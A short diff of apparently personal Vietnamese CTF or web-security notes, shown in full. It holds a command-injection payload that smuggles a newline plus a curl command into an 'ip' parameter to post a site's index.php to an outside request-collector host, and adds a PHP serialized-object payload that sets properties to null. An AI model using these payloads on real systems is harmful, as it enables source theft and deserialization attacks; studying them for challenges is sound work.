@@ -24,5 +24,7 @@ echo $get ; // lúc trưa truyền thì in ra notme , khi get=jjjj in ra jjj
  
  ---
  ip=localhost%0Acurl -X POST -F file=@index.php https://requestbin.fullcontact.com/  blind commandline , in ra 1 file
+ 
+ O:4:"test":2:{s:7:"jackpot";N;s:5:"enter";N;} , tạo giá trị null, obj , hoặc nan,
 
 
